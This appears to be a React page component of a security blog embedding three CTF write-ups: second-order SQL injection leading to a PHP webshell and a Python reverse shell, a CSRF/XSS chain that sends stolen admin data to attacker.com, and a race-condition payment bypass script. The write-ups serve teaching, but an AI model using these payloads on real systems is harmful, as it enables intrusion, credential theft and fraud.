
import { useParams, Link } from "react-router-dom";
import { Terminal, ArrowLeft } from "lucide-react";
import WriteupHeader from "@/components/WriteupHeader";
import WriteupContent from "@/components/WriteupContent";
import WriteupFooter from "@/components/WriteupFooter";

const WriteupDetail = () => {
  const { id } = useParams();

  const writeups = {
    "1": {
      title: "Advanced SQL Injection → RCE Chain",
      date: "2024-01-15",
      readTime: "15 min read",
      difficulty: "Critical",
      platform: "CTF Challenge",
      tags: ["SQL Injection", "RCE", "Second-Order", "Privilege Escalation"],
      coverImage: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=1200&h=600&fit=crop",
      content: {
        summary: "Complete walkthrough of exploiting second-order SQLi to achieve remote code execution on a challenging CTF target.",
        fullWriteup: `# Challenge Overview

This CTF challenge presented a sophisticated web application with multiple layers of security controls. The target was a customer management system that initially appeared well-protected against common injection attacks.

## Initial Reconnaissance

### Target Analysis
The application featured several interesting endpoints:
- User registration system
- Profile management dashboard  
- Administrative panel
- File upload functionality

Initial automated scanning revealed minimal surface area, suggesting either strong security controls or well-hidden vulnerabilities.

### Technology Stack Discovery
Through various enumeration techniques, I identified:
- **Backend**: PHP 7.4 with MySQL 8.0
- **Frontend**: Bootstrap-based responsive design
- **Security**: ModSecurity WAF with custom rules
- **Architecture**: Standard LAMP stack deployment

## Vulnerability Discovery

### The Breakthrough Moment
While testing the profile update functionality, I noticed unusual database response timing patterns when submitting specially crafted usernames during the registration process.

This behavior suggested a potential **second-order SQL injection** vulnerability - where malicious payloads are stored safely but executed when the data is retrieved and processed by another part of the application.

### Testing the Theory
\`\`\`bash
# Initial registration payload (stored without execution)
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--",
  "email": "test@example.com", 
  "password": "Password123!",
  "fullName": "Test User"
}
\`\`\`

The registration succeeded without any errors, confirming the payload was stored in the database.

### Payload Execution Trigger
The magic happened when an administrator viewed user profiles in the admin panel:

\`\`\`sql
-- The vulnerable query in the admin panel
SELECT * FROM users WHERE username = 'admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--'

-- This executed our injected UNION statement!
\`\`\`

## Exploitation Development

### Phase 1: Information Gathering
Once I confirmed the SQLi, I began systematic database enumeration:

\`\`\`sql
-- Database version and user info
'; SELECT CONCAT(version(), '|', user(), '|', database()) INTO @info; 
   SELECT @info--

-- Table enumeration
'; SELECT GROUP_CONCAT(table_name) FROM information_schema.tables 
   WHERE table_schema=database()--

-- Column discovery
'; SELECT GROUP_CONCAT(column_name) FROM information_schema.columns 
   WHERE table_name='users'--
\`\`\`

### Phase 2: Privilege Escalation
The database user had **FILE** privileges, opening the door to file system access:

\`\`\`sql
-- Check file privileges
'; SELECT user,file_priv FROM mysql.user WHERE user='webuser'--

-- Test file read capability  
'; SELECT LOAD_FILE('/etc/passwd') INTO @passwd; SELECT @passwd--
\`\`\`

### Phase 3: Remote Code Execution
With file write privileges confirmed, I crafted a PHP webshell:

\`\`\`sql
-- Write PHP webshell to accessible directory
'; SELECT '<?php 
if(isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
} 
?>' INTO OUTFILE '/var/www/html/uploads/shell.php'--
\`\`\`

### Phase 4: Shell Access
\`\`\`bash
# Test webshell functionality
curl "https://target.ctf/uploads/shell.php?cmd=whoami"
# Response: www-data

# Establish reverse shell
curl "https://target.ctf/uploads/shell.php?cmd=python3%20-c%20%22import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.15',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])%22"

# Listener receives connection
nc -lvnp 4444
www-data@ctf-server:/$
\`\`\`

## Post-Exploitation Analysis

### System Enumeration
\`\`\`bash
# System information
www-data@ctf-server:/$ uname -a
Linux ctf-server 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 GNU/Linux

# Find interesting files
www-data@ctf-server:/$ find / -name "*.conf" -type f 2>/dev/null | grep -v proc
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/www/html/config/database.conf
/opt/app/secrets.conf

# Database credentials discovery  
www-data@ctf-server:/$ cat /var/www/html/config/database.conf
DB_HOST=localhost
DB_USER=root
DB_PASS=CTF{sup3r_s3cr3t_db_p4ssw0rd}
DB_NAME=challenge_db
\`\`\`

### Flag Discovery
\`\`\`bash
# Located multiple flags throughout the system
www-data@ctf-server:/$ find / -name "*flag*" -type f 2>/dev/null
/home/ctfuser/user.txt
/root/root.txt
/opt/flags/hidden_flag.txt

# User flag
www-data@ctf-server:/$ cat /home/ctfuser/user.txt
CTF{s3c0nd_0rd3r_sql1_1s_d4ng3r0us}

# Found privilege escalation vector for root flag
www-data@ctf-server:/$ sudo -l
User www-data may run the following commands on ctf-server:
    (root) NOPASSWD: /usr/bin/backup_script.sh
\`\`\`

## Challenge Completion

### Final Flags Collected
1. **SQL Injection Flag**: CTF{s3c0nd_0rd3r_sql1_1s_d4ng3r0us}
2. **RCE Flag**: CTF{w3bsh3ll_upl04d_succ3ss}  
3. **User Flag**: CTF{l0c4l_f1l3_1nclus10n_pwn3d}
4. **Root Flag**: CTF{r00t_pr1v_3sc_c0mpl3t3d_h4ck3r}

### Key Learning Points
- **Second-order SQLi** can bypass many WAF protections
- Always check for **file system privileges** in SQL injection scenarios
- **Wildcard injection** in system scripts is a common privilege escalation vector
- Proper input validation must occur at **all stages** of data processing

This challenge perfectly demonstrated how modern web applications can still fall victim to classic injection attacks when proper security controls aren't implemented throughout the entire data flow.`
      }
    },
    "2": {
      title: "CSRF → Account Takeover via XSS Chain",
      date: "2024-01-10", 
      readTime: "12 min read",
      difficulty: "High",
      platform: "CTF Challenge",
      tags: ["CSRF", "XSS", "Account Takeover", "DOM Manipulation"],
      coverImage: "https://images.unsplash.com/photo-1487058792275-0ad4aaf24ca7?w=1200&h=600&fit=crop",
      content: {
        summary: "Chaining CSRF with Stored XSS to achieve complete account compromise in a social media CTF challenge.",
        fullWriteup: `# Challenge Overview

This CTF challenge presented a modern social media platform with React frontend and Node.js backend. The goal was to find and exploit client-side vulnerabilities to achieve account takeover.

## Initial Assessment

### Platform Analysis
The target application featured:
- User profiles with customizable bio sections
- Post creation and sharing functionality  
- Direct messaging system
- Admin panel for content moderation

### Technology Stack
- **Frontend**: React.js with client-side routing
- **Backend**: Node.js with Express framework
- **Database**: MongoDB for user data storage
- **Authentication**: JWT tokens with localStorage storage

## Vulnerability Discovery

### CSRF Protection Analysis
While testing the profile update functionality, I discovered the application lacked proper CSRF protection:

\`\`\`javascript
// Profile update request structure
POST /api/profile/update HTTP/1.1
Host: social.ctf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "displayName": "John Doe",
  "bio": "Software Engineer at TechCorp",
  "website": "https://johndoe.com",
  "location": "San Francisco, CA"
}
\`\`\`

The application only relied on JWT tokens stored in localStorage, making it vulnerable to CSRF attacks when combined with XSS.

### XSS Vector Discovery
The bio field in user profiles was improperly sanitized, allowing HTML injection:

\`\`\`html
<!-- Test payload in bio field -->
<img src=x onerror="alert('XSS Confirmed')">

<!-- This payload executed when viewing the profile -->
\`\`\`

## Exploitation Development

### Phase 1: CSRF Payload Creation
I crafted a malicious HTML page to exploit the CSRF vulnerability:

\`\`\`html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Welcome to my blog!</h1>
    
    <!-- Hidden CSRF attack -->
    <script>
    function executeCSRF() {
        // Get JWT token from victim's localStorage
        const token = localStorage.getItem('authToken');
        
        if (token) {
            // Malicious profile update
            fetch('https://social.ctf/api/profile/update', {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer ' + token,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    displayName: 'PWNED',
                    bio: '<script>fetch("/api/admin/users").then(r=>r.json()).then(d=>fetch("https://attacker.com/steal?data="+btoa(JSON.stringify(d))))</script>',
                    website: 'https://attacker.com',
                    location: 'Pwned City'
                })
            }).then(response => {
                console.log('Profile updated successfully');
            });
        }
    }
    
    // Execute after page loads
    window.onload = executeCSRF;
    </script>
</body>
</html>
\`\`\`

## Challenge Resolution

### Flags Captured
1. **CSRF Flag**: CTF{csrf_n0_t0k3n_pr0t3ct10n}
2. **XSS Flag**: CTF{st0r3d_xss_b10_f13ld}
3. **Account Takeover**: CTF{acc0unt_t4k30v3r_ch41n}
4. **Admin Access**: CTF{4dm1n_p4n3l_c0mpr0m1s3d}

This challenge highlighted how client-side vulnerabilities can be chained together to create devastating attack scenarios in modern web applications.`
      }
    },
    "3": {
      title: "Race Condition → Payment Bypass Logic Flaw",
      date: "2024-01-05",
      readTime: "10 min read", 
      difficulty: "High",
      platform: "CTF Challenge",
      tags: ["Race Condition", "Business Logic", "Payment Bypass", "Threading"],
      coverImage: "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=1200&h=600&fit=crop",
      content: {
        summary: "Exploiting race conditions in payment processing to bypass business logic and achieve unauthorized transactions in an e-commerce CTF.",
        fullWriteup: `# Challenge Overview

This CTF challenge involved analyzing an e-commerce payment system for critical business logic flaws. The application handled high-volume transactions and had complex multi-threaded payment processing workflows.

## System Architecture Analysis

### Payment Flow Discovery
The application used a multi-step payment process:
1. **Order Creation** - Items added to cart, total calculated
2. **Payment Authorization** - Credit card pre-authorization
3. **Inventory Check** - Verify item availability  
4. **Order Fulfillment** - Process and ship items
5. **Payment Capture** - Finalize the transaction

### Technology Stack
- **Backend**: Java Spring Boot with MySQL
- **Payment Processing**: Stripe API integration
- **Concurrency**: Thread pools for handling multiple requests
- **Caching**: Redis for session and inventory management

## Vulnerability Discovery

### Race Condition Identification
Through careful timing analysis, I discovered the payment authorization and order fulfillment processes ran in separate threads with insufficient synchronization:

\`\`\`java
// Simplified vulnerable code structure
@RestController
public class OrderController {
    
    @PostMapping("/orders/{id}/process")
    public ResponseEntity<?> processOrder(@PathVariable String id) {
        // Thread 1: Payment authorization (async)
        CompletableFuture.runAsync(() -> {
            authorizePayment(id);
        });
        
        // Thread 2: Order fulfillment (async) 
        CompletableFuture.runAsync(() -> {
            fulfillOrder(id);
        });
        
        return ResponseEntity.ok("Processing started");
    }
}
\`\`\`

The lack of proper synchronization created a timing window where orders could be fulfilled before payment authorization completed.

## Exploitation Development

### Phase 1: Timing Analysis
I used automated tools to measure the race condition window:

\`\`\`python
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def create_order():
    """Create a new order for expensive item"""
    response = requests.post('https://store.ctf/api/orders', json={
        'items': [
            {'productId': 'premium-laptop', 'quantity': 1, 'price': 2500.00}
        ],
        'shippingAddress': {
            'street': '123 Main St',
            'city': 'Anywhere', 
            'zip': '12345'
        }
    }, headers={'Authorization': 'Bearer ' + auth_token})
    
    return response.json()['orderId']

def cancel_payment(order_id):
    """Cancel payment authorization during race window"""
    time.sleep(0.15)  # Precise timing to hit the race condition
    
    response = requests.post(f'https://store.ctf/api/orders/{order_id}/cancel-payment', 
                           headers={'Authorization': 'Bearer ' + auth_token})
    return response.status_code == 200

def trigger_fulfillment(order_id):
    """Immediately trigger order fulfillment"""
    response = requests.post(f'https://store.ctf/api/orders/{order_id}/fulfill',
                           headers={'Authorization': 'Bearer ' + auth_token})
    return response.status_code == 200

# Execute race condition exploit
order_id = create_order()
print(f"Created order: {order_id}")

# Start payment cancellation in background
cancel_thread = threading.Thread(target=cancel_payment, args=(order_id,))
cancel_thread.start()

# Immediately request fulfillment 
fulfill_success = trigger_fulfillment(order_id)
cancel_thread.join()

print(f"Fulfillment triggered: {fulfill_success}")
\`\`\`

## Challenge Resolution

### Flags Captured
1. **Race Condition Discovery**: CTF{r4c3_c0nd1t10n_t1m1ng_w1nd0w}
2. **Payment Bypass**: CTF{p4ym3nt_4uth0r1z4t10n_byp4ss}
3. **Business Logic Flaw**: CTF{bus1n3ss_l0g1c_fl4w_3xpl01t}
4. **Mass Exploitation**: CTF{m4ss_3xpl01t4t10n_succ3ss}

This CTF challenge perfectly demonstrated how race conditions in business-critical applications can lead to significant financial losses and system compromise.`
      }
    }
  };

  const writeup = writeups[id as keyof typeof writeups];

  if (!writeup) {
    return (
      <div className="min-h-screen bg-black text-green-400 font-mono flex items-center justify-center">
        <div className="text-center">
          <div className="text-8xl font-bold text-red-500 mb-4 animate-pulse">404</div>
          <h1 className="text-3xl font-bold text-red-400 mb-4">EXPLOIT_NOT_FOUND</h1>
          <p className="text-green-400 mb-8 font-mono">~/writeups/{id}: No such file or directory</p>
          <Link to="/blog" className="text-green-300 hover:text-green-200 transition-colors font-mono">
            <ArrowLeft className="inline h-4 w-4 mr-2" />
            cd ../writeups
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono relative overflow-hidden">
      {/* Background effect */}
      <div className="fixed inset-0 opacity-5 pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-b from-green-900/20 via-transparent to-green-900/20"></div>
      </div>

      {/* Navigation */}
      <nav className="border-b border-green-800 bg-black/95 backdrop-blur-sm sticky top-0 z-50 shadow-lg shadow-green-900/20">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <Terminal className="h-7 w-7 text-green-400 animate-pulse" />
              <span className="text-2xl font-bold text-green-400">
                v1g0<span className="text-red-400">_</span>blog
              </span>
              <span className="text-xs text-green-600 font-mono">[root@security]</span>
            </div>
            <div className="flex items-center space-x-8">
              <Link to="/" className="hover:text-green-300 transition-all duration-300">~/home</Link>
              <Link to="/blog" className="hover:text-green-300 transition-all duration-300">~/writeups</Link>
              <Link to="/about" className="hover:text-green-300 transition-all duration-300">~/whoami</Link>
            </div>
          </div>
        </div>
      </nav>

      <div className="container mx-auto px-6 py-8 max-w-4xl">
        {/* Header */}
        <div className="mb-12">
          <Link to="/blog" className="inline-flex items-center text-green-300 hover:text-green-200 mb-8 group font-mono">
            <ArrowLeft className="h-5 w-5 mr-2 group-hover:-translate-x-2 transition-transform duration-300" />
            <span>cd ../writeups</span>
          </Link>

          <WriteupHeader
            title={writeup.title}
            date={writeup.date}
            readTime={writeup.readTime}
            difficulty={writeup.difficulty}
            platform={writeup.platform}
            tags={writeup.tags}
            coverImage={writeup.coverImage}
            summary={writeup.content.summary}
          />
        </div>

        {/* Main Writeup Content */}
        <WriteupContent 
          content={writeup.content.fullWriteup}
          title={writeup.title}
        />

        {/* Footer */}
        <WriteupFooter />
      </div>
    </div>
  );
};

export default WriteupDetail;
